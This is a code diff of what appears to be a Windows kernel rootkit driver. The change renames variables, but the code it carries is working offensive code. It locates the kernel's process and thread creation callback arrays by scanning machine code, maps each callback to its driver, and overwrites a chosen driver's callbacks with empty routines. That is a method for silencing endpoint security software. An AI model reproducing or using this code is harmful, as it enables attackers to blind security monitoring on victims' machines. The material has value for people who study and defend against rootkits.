@@ -12,13 +12,13 @@
 VOID
 BeEnumerateDrivers()
 {
-    PKLDR_DATA_TABLE_ENTRY Entry = (PKLDR_DATA_TABLE_ENTRY)(BeGlobals::diskDriverObject)->DriverSection;
-    PKLDR_DATA_TABLE_ENTRY First = Entry;
+    PKLDR_DATA_TABLE_ENTRY entry = (PKLDR_DATA_TABLE_ENTRY)(BeGlobals::diskDriverObject)->DriverSection;
+    PKLDR_DATA_TABLE_ENTRY first = entry;
 
-    while ((PKLDR_DATA_TABLE_ENTRY)Entry->InLoadOrderLinks.Flink != First)
+    while ((PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink != first)
     {
-        LOG_MSG("Driver: 0x%llx :: %ls\r\n", Entry->DllBase, Entry->BaseDllName.Buffer);
-        Entry = (PKLDR_DATA_TABLE_ENTRY)Entry->InLoadOrderLinks.Flink;
+        LOG_MSG("Driver: 0x%llx :: %ls\r\n", entry->DllBase, entry->BaseDllName.Buffer);
+        entry = (PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink;
     }
 }
 
@@ -30,28 +30,30 @@ BeEnumerateDrivers()
  * @returns PKLDR_DATA_TABLE_ENTRY The driver entry containing the address, or NULL if not found.
  */
 PKLDR_DATA_TABLE_ENTRY
-BeGetDriverForAddress(_In_ UINT64 Address)
+BeGetDriverForAddress(
+    _In_ UINT64 address
+)
 {
-    PKLDR_DATA_TABLE_ENTRY Entry = (PKLDR_DATA_TABLE_ENTRY)(BeGlobals::diskDriverObject)->DriverSection;
+    PKLDR_DATA_TABLE_ENTRY entry = (PKLDR_DATA_TABLE_ENTRY)(BeGlobals::diskDriverObject)->DriverSection;
 
-    LOG_MSG("Looking for address: 0x%llx\r\n", Address);
+    LOG_MSG("Looking for address: 0x%llx\r\n", address);
 
     //
     // TODO: dirty hack to avoid bug
     //
-    for (auto I = 0; I < 512; ++I)
+    for (auto i = 0; i < 512; ++i)
     {
-        UINT64 StartAddr = UINT64(Entry->DllBase);
-        UINT64 EndAddr = StartAddr + UINT64(Entry->SizeOfImage);
+        UINT64 startAddr = UINT64(entry->DllBase);
+        UINT64 endAddr = startAddr + UINT64(entry->SizeOfImage);
 
-        LOG_MSG("Looking for: %ls 0x%llx 0x%llx\r\n", Entry->BaseDllName.Buffer, StartAddr, EndAddr);
+        LOG_MSG("Looking for: %ls 0x%llx 0x%llx\r\n", entry->BaseDllName.Buffer, startAddr, endAddr);
 
-        if (Address >= StartAddr && Address < EndAddr)
+        if (address >= startAddr && address < endAddr)
         {
-            return (PKLDR_DATA_TABLE_ENTRY)Entry;
+            return (PKLDR_DATA_TABLE_ENTRY)entry;
         }
 
-        Entry = (PKLDR_DATA_TABLE_ENTRY)Entry->InLoadOrderLinks.Flink;
+        entry = (PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink;
     }
 
     return NULL;
@@ -68,35 +70,37 @@ BeGetDriverForAddress(_In_ UINT64 Address)
  * @return UINT64 The address of the callbackRoutine array.
  */
 UINT64
-BeGetKernelCallbackArrayAddr(_In_ CALLBACK_TYPE Type)
+BeGetKernelCallbackArrayAddr(
+    _In_ CALLBACK_TYPE type
+)
 {
     BeEnumerateDrivers();
-    PCHAR CallbackRoutineName;
+    PCHAR callbackRoutineName;
 
-    switch (Type)
+    switch (type)
     {
     case CreateProcessNotifyRoutine:
-        CallbackRoutineName = "PsSetCreateProcessNotifyRoutine";
+        callbackRoutineName = "PsSetCreateProcessNotifyRoutine";
         break;
     case CreateThreadNotifyRoutine:
-        CallbackRoutineName = "PsSetCreateThreadNotifyRoutine";
+        callbackRoutineName = "PsSetCreateThreadNotifyRoutine";
         break;
     default:
         LOG_MSG("Unsupported callback type\r\n");
         return NULL;
     }
 
-    UINT64 CallbackRoutineAddr = 0;
-    UINT64 PspCallbackRoutineAddr = 0;
-    UINT64 CallbackRoutineArrayAddr = 0;
+    UINT64 callbackRoutineAddr = 0;
+    UINT64 pspCallbackRoutineAddr = 0;
+    UINT64 callbackRoutineArrayAddr = 0;
 
-    if (Type == CreateProcessNotifyRoutine || Type == CreateThreadNotifyRoutine)
+    if (type == CreateProcessNotifyRoutine || type == CreateThreadNotifyRoutine)
     {
         //
         // Resolve PsSetCreateXYZNotifyRoutine
         //
-        CallbackRoutineAddr = (DWORD64)BeGetSystemRoutineAddress("ntoskrnl.exe", CallbackRoutineName);
-        if (!CallbackRoutineAddr)
+        callbackRoutineAddr = (DWORD64)BeGetSystemRoutineAddress("ntoskrnl.exe", callbackRoutineName);
+        if (!callbackRoutineAddr)
         {
             LOG_MSG("Failed to resolve set-notify routine\r\n");
             return NULL;
@@ -106,32 +110,32 @@ BeGetKernelCallbackArrayAddr(_In_ CALLBACK_TYPE Type)
         // Now resolve PspSetCreateXYZNotifyRoutine
         // we look for CALL/JMP PspSetCreateXYZNotifyRoutine in the function assembly
         //
-        for (INT I = 0; I < 500; ++I)
+        for (UINT16 i = 0; i < 500; ++i)
         {
-            if ((*(BYTE*)(CallbackRoutineAddr + I) == ASM_CALL_NEAR)
-                || (*(BYTE*)(CallbackRoutineAddr + I) == ASM_JMP_NEAR))
+            if ((*(BYTE*)(callbackRoutineAddr + i) == ASM_CALL_NEAR)
+                || (*(BYTE*)(callbackRoutineAddr + i) == ASM_JMP_NEAR))
             {
                 //
                 // Param for CALL is offset to our routine
                 //
-                LOG_MSG("Offset: 0x%llx\r\n", *(PUINT32*)(CallbackRoutineAddr + I + 1));
-                UINT32 Offset = *(PUINT32)(CallbackRoutineAddr + I + 1);
+                LOG_MSG("Offset: 0x%llx\r\n", *(PUINT32*)(callbackRoutineAddr + i + 1));
+                UINT32 offset = *(PUINT32)(callbackRoutineAddr + i + 1);
 
                 //
                 // Add offset to addr of next instruction to get psp address
                 //
-                PspCallbackRoutineAddr = CallbackRoutineAddr + I + Offset + 5;
+                pspCallbackRoutineAddr = callbackRoutineAddr + i + offset + 5;
                 break;
             }
         }
 
-        if (!PspCallbackRoutineAddr)
+        if (!pspCallbackRoutineAddr)
         {
             LOG_MSG("Failed to resolve private setnotify routine\r\n");
             return NULL;
         }
 
-        LOG_MSG("Private (psp) NotifyRoutine: 0x%llx\r\n", PspCallbackRoutineAddr);
+        LOG_MSG("Private (psp) NotifyRoutine: 0x%llx\r\n", pspCallbackRoutineAddr);
 
         //
         // Now we resolve the array of callbacks
@@ -139,29 +143,29 @@ BeGetKernelCallbackArrayAddr(_In_ CALLBACK_TYPE Type)
         //
         for (INT I = 0; I < 500; ++I)
         {
-            if ((*(BYTE*)(PspCallbackRoutineAddr + I) == ASM_LEA_R13_BYTE1 && *(BYTE*)(PspCallbackRoutineAddr + I + 1) == ASM_LEA_R13_BYTE2)
-                || (*(BYTE*)(PspCallbackRoutineAddr + I) == ASM_LEA_RCX_BYTE1 && *(BYTE*)(PspCallbackRoutineAddr + I + 1) == ASM_LEA_RCX_BYTE2))
+            if ((*(BYTE*)(pspCallbackRoutineAddr + I) == ASM_LEA_R13_BYTE1 && *(BYTE*)(pspCallbackRoutineAddr + I + 1) == ASM_LEA_R13_BYTE2)
+                || (*(BYTE*)(pspCallbackRoutineAddr + I) == ASM_LEA_RCX_BYTE1 && *(BYTE*)(pspCallbackRoutineAddr + I + 1) == ASM_LEA_RCX_BYTE2))
             {
                 //
                 // Param for LEA is the address of the callback array
                 //
-                UINT32 Offset = *(PUINT32)(PspCallbackRoutineAddr + I + 3);
+                UINT32 offset = *(PUINT32)(pspCallbackRoutineAddr + I + 3);
 
                 //
                 // Add ofset to next instruction to get callback array addr
                 //
-                CallbackRoutineArrayAddr = PspCallbackRoutineAddr + I + Offset + 7;
+                callbackRoutineArrayAddr = pspCallbackRoutineAddr + I + offset + 7;
                 break;
             }
         }
 
-        if (!PspCallbackRoutineAddr)
+        if (!pspCallbackRoutineAddr)
         {
             LOG_MSG("Failed to resolve Array for callbacks\r\n");
             return NULL;
         }
 
-        return CallbackRoutineArrayAddr;
+        return callbackRoutineArrayAddr;
     }
 
     return NULL;
@@ -177,105 +181,102 @@ BeGetKernelCallbackArrayAddr(_In_ CALLBACK_TYPE Type)
 ktd::vector<CALLBACK_DATA, PagedPool>
 BeEnumerateKernelCallbacks(_In_ CALLBACK_TYPE Type)
 {
-    auto Data = ktd::vector<CALLBACK_DATA, PagedPool>();
+    auto data = ktd::vector<CALLBACK_DATA, PagedPool>();
 
     //
     // Get address for the kernel callback array
     //
-    auto ArrayAddr = BeGetKernelCallbackArrayAddr(Type);
-    if (!ArrayAddr)
+    auto arrayAddr = BeGetKernelCallbackArrayAddr(Type);
+    if (!arrayAddr)
     {
         LOG_MSG("Failed to get array addr for kernel callbacks\r\n");
-        return Data;
+        return data;
     }
 
-    LOG_MSG("Array for callbacks: 0x%llx\r\n", ArrayAddr);
+    LOG_MSG("Array for callbacks: 0x%llx\r\n", arrayAddr);
 
     //
     // TODO: max number
     //
-    for (INT I = 0; I < 16; ++I)
+    for (UINT8 i = 0; i < 16; ++i)
     {
         //
         // get current address & align the addresses to 0x10 (https://medium.com/@yardenshafir2/windbg-the-fun-way-part-2-7a904cba5435)
         //
-        PVOID CurrCallbackBlockAddr = (PVOID)(((UINT64*)ArrayAddr)[I] & 0xFFFFFFFFFFFFFFF0);
-        if (!CurrCallbackBlockAddr)
+        PVOID currCallbackBlockAddr = (PVOID)(((UINT64*)arrayAddr)[i] & 0xFFFFFFFFFFFFFFF0);
+        if (!currCallbackBlockAddr)
             continue;
 
         //
         // cast to callback routine block
         //
-        auto CurrCallbackBlock = *((EX_CALLBACK_ROUTINE_BLOCK*)CurrCallbackBlockAddr);
+        auto currCallbackBlock = *((EX_CALLBACK_ROUTINE_BLOCK*)currCallbackBlockAddr);
 
         //
         // Get function address
         //
-        auto CallbackFunctionAddr = (UINT64)CurrCallbackBlock.Function;
+        auto callbackFunctionAddr = (UINT64)currCallbackBlock.Function;
 
         //
         // Get corresponding driver
         //
-        auto Driver = BeGetDriverForAddress(CallbackFunctionAddr);
+        auto driver = BeGetDriverForAddress(callbackFunctionAddr);
 
         //
         // If unbacked memory with no associated driver
         //
-        if (Driver == NULL)
+        if (driver == NULL)
         {
             //
             // Print info
             //
-            LOG_MSG("Callback: <Unbacked Memory>, 0x%llx\r\n", CallbackFunctionAddr);
+            LOG_MSG("Callback: <Unbacked Memory>, 0x%llx\r\n", callbackFunctionAddr);
 
             //
             // Create result struct
             //
-            CALLBACK_DATA Pcc = {
+            CALLBACK_DATA pcc = {
                 0,
-                CallbackFunctionAddr,
+                callbackFunctionAddr,
                 NULL
             };
 
-            PWCH PwsUnbacked = L"Unbacked";
-            memcpy(Pcc.driverName, PwsUnbacked, (wcslen(PwsUnbacked) + 1) * sizeof(WCHAR));
+            PWCH pwsUnbacked = L"Unbacked";
+            memcpy(pcc.driverName, pwsUnbacked, (wcslen(pwsUnbacked) + 1) * sizeof(WCHAR));
 
             //
             // add to results
             //
-            Data.push_back(Pcc);
+            data.push_back(pcc);
         }
         else
         {
             //
             // Calculate offset of function
             //
-            auto Offset = CallbackFunctionAddr - (UINT64)(Driver->DllBase);
+            auto offset = callbackFunctionAddr - (UINT64)(driver->DllBase);
 
-            //
-            // Print info
-            //
-            LOG_MSG("Callback: %ls, 0x%llx + 0x%llx\r\n", Driver->BaseDllName.Buffer, (UINT64)Driver->DllBase, Offset);
+            LOG_MSG("Callback: %ls, 0x%llx + 0x%llx\r\n", driver->BaseDllName.Buffer, (UINT64)driver->DllBase, offset);
 
             //
             // Create result struct
             //
             CALLBACK_DATA Pcc = {
-                (UINT64)Driver->DllBase,
-                Offset,
+                (UINT64)driver->DllBase,
+                offset,
                 NULL
             };
 
-            memcpy(Pcc.driverName, Driver->BaseDllName.Buffer, (wcslen(Driver->BaseDllName.Buffer) + 1) * sizeof(WCHAR));
+            memcpy(Pcc.driverName, driver->BaseDllName.Buffer, (wcslen(driver->BaseDllName.Buffer) + 1) * sizeof(WCHAR));
 
             //
             // Add to results
             //
-            Data.push_back(Pcc);
+            data.push_back(Pcc);
         }
     }
 
-    return Data;
+    return data;
 }
 
 /**
@@ -283,13 +284,14 @@ BeEnumerateKernelCallbacks(_In_ CALLBACK_TYPE Type)
  */
 VOID
 BeEmptyCreateProcessNotifyRoutine(
-    _In_ HANDLE  ParentId,
-    _In_ HANDLE  ProcessId,
-    _In_ BOOLEAN Create
-) {
-    UNREFERENCED_PARAMETER(ParentId);
-    UNREFERENCED_PARAMETER(ProcessId);
-    UNREFERENCED_PARAMETER(Create);
+    _In_ HANDLE  parentId,
+    _In_ HANDLE  processId,
+    _In_ BOOLEAN create
+) 
+{
+    UNREFERENCED_PARAMETER(parentId);
+    UNREFERENCED_PARAMETER(processId);
+    UNREFERENCED_PARAMETER(create);
 
     AutoLock<FastMutex> _lock(BeGlobals::CallbackLock);
 }
@@ -299,13 +301,13 @@ BeEmptyCreateProcessNotifyRoutine(
  */
 VOID
 BeEmptyCreateThreadNotifyRoutine(
-    _In_ HANDLE  ProcessId,
-    _In_ HANDLE  ThreadId,
-    _In_ BOOLEAN Create
+    _In_ HANDLE  processId,
+    _In_ HANDLE  threadId,
+    _In_ BOOLEAN create
 ) {
-    UNREFERENCED_PARAMETER(ProcessId);
-    UNREFERENCED_PARAMETER(ThreadId);
-    UNREFERENCED_PARAMETER(Create);
+    UNREFERENCED_PARAMETER(processId);
+    UNREFERENCED_PARAMETER(threadId);
+    UNREFERENCED_PARAMETER(create);
 
     AutoLock<FastMutex> _lock(BeGlobals::CallbackLock);
 }
@@ -320,51 +322,52 @@ BeEmptyCreateThreadNotifyRoutine(
  */
 NTSTATUS
 BeReplaceKernelCallbacksOfDriver(
-    _In_ PWCH TargetDriverModuleName,
-    _In_ CALLBACK_TYPE Type
-) {
-    LOG_MSG("Target: %S\n", TargetDriverModuleName);
+    _In_ PWCH targetDriverModuleName,
+    _In_ CALLBACK_TYPE type
+) 
+{
+    LOG_MSG("Target: %S\n", targetDriverModuleName);
 
     //
     // Get address for the kernel callback array
     //
-    auto ArrayAddr = BeGetKernelCallbackArrayAddr(Type);
-    if (!ArrayAddr)
+    auto arrayAddr = BeGetKernelCallbackArrayAddr(type);
+    if (!arrayAddr)
     {
         LOG_MSG("Failed to get array addr for kernel callbacks\r\n");
         return STATUS_NOT_FOUND;
     }
 
-    LOG_MSG("Array for callbacks: 0x%llx\r\n", ArrayAddr);
+    LOG_MSG("Array for callbacks: 0x%llx\r\n", arrayAddr);
 
     //
     // TODO: max number
     //
-    for (INT I = 0; I < 16; ++I)
+    for (UINT16 i = 0; i < 16; ++i)
     {
         //
         // Get callback array address & align the addresses to 0x10 (https://medium.com/@yardenshafir2/windbg-the-fun-way-part-2-7a904cba5435)
         //
-        auto CurrCallbackBlockAddr = (PVOID)(((UINT64*)ArrayAddr)[I] & 0xFFFFFFFFFFFFFFF0);
-        if (!CurrCallbackBlockAddr)
+        auto currCallbackBlockAddr = (PVOID)(((UINT64*)arrayAddr)[i] & 0xFFFFFFFFFFFFFFF0);
+        if (!currCallbackBlockAddr)
             continue;
 
         //
         // Cast to callback routine block
         //
-        auto CurrCallbackBlock = *((EX_CALLBACK_ROUTINE_BLOCK*)CurrCallbackBlockAddr);
+        auto currCallbackBlock = *((EX_CALLBACK_ROUTINE_BLOCK*)currCallbackBlockAddr);
 
         //
         // Get function address
         //
-        auto CallbackFunctionAddr = (UINT64)CurrCallbackBlock.Function;
+        auto callbackFunctionAddr = (UINT64)currCallbackBlock.Function;
 
         //
         // Get corresponding driver
         //
-        auto Driver = BeGetDriverForAddress(CallbackFunctionAddr);
+        auto driver = BeGetDriverForAddress(callbackFunctionAddr);
 
-        if (!Driver)
+        if (!driver)
         {
             LOG_MSG("Didnt find driver for callback\r\n");
             continue;
@@ -373,34 +376,31 @@ BeReplaceKernelCallbacksOfDriver(
         //
         // If it is the driver were looking for
         //
-        if (wcscmp(Driver->BaseDllName.Buffer, TargetDriverModuleName) == 0)
+        if (wcscmp(driver->BaseDllName.Buffer, targetDriverModuleName) == 0)
         {
             //
             // Calculate offset of function
             //
-            auto Offset = CallbackFunctionAddr - (UINT64)(Driver->DllBase);
+            auto offset = callbackFunctionAddr - (UINT64)(driver->DllBase);
 
-            //
-            // Print info
-            //
-            LOG_MSG("Replacing callback with empty callback: %ls, 0x%llx + 0x%llx\r\n", Driver->BaseDllName.Buffer, (UINT64)Driver->DllBase, Offset);
+            LOG_MSG("Replacing callback with empty callback: %ls, 0x%llx + 0x%llx\r\n", driver->BaseDllName.Buffer, (UINT64)driver->DllBase, offset);
 
-            auto AddrOfCallbackFunction = (ULONG64)CurrCallbackBlockAddr + sizeof(ULONG_PTR);
+            auto addrOfCallbackFunction = (ULONG64)currCallbackBlockAddr + sizeof(ULONG_PTR);
 
             {
                 AutoLock<FastMutex> _lock(BeGlobals::CallbackLock);
-                LONG64 OldCallbackAddress;
+                LONG64 oldCallbackAddress;
 
                 //
                 // Replace routine by empty routine
                 //
-                switch (Type)
+                switch (type)
                 {
                 case CreateProcessNotifyRoutine:
-                    OldCallbackAddress = InterlockedExchange64((LONG64*)AddrOfCallbackFunction, (LONG64)&BeEmptyCreateProcessNotifyRoutine);
+                    oldCallbackAddress = InterlockedExchange64((LONG64*)addrOfCallbackFunction, (LONG64)&BeEmptyCreateProcessNotifyRoutine);
                     break;
                 case CreateThreadNotifyRoutine:
-                    OldCallbackAddress = InterlockedExchange64((LONG64*)AddrOfCallbackFunction, (LONG64)&BeEmptyCreateThreadNotifyRoutine);
+                    oldCallbackAddress = InterlockedExchange64((LONG64*)addrOfCallbackFunction, (LONG64)&BeEmptyCreateThreadNotifyRoutine);
                     break;
                 default:
                     LOG_MSG("Invalid callback type\r\n");
@@ -411,9 +411,9 @@ BeReplaceKernelCallbacksOfDriver(
                 //
                 // Save old callback to restore later upon unloading
                 //
-                BeGlobals::BeCallbacksToRestore.addrOfCallbackFunction[BeGlobals::BeCallbacksToRestore.length] = AddrOfCallbackFunction;
-                BeGlobals::BeCallbacksToRestore.callbackToRestore[BeGlobals::BeCallbacksToRestore.length] = OldCallbackAddress;
-                BeGlobals::BeCallbacksToRestore.callbackType[BeGlobals::BeCallbacksToRestore.length] = Type;
+                BeGlobals::BeCallbacksToRestore.addrOfCallbackFunction[BeGlobals::BeCallbacksToRestore.length] = addrOfCallbackFunction;
+                BeGlobals::BeCallbacksToRestore.callbackToRestore[BeGlobals::BeCallbacksToRestore.length] = oldCallbackAddress;
+                BeGlobals::BeCallbacksToRestore.callbackType[BeGlobals::BeCallbacksToRestore.length] = type;
                 BeGlobals::BeCallbacksToRestore.length++;
             }
         }
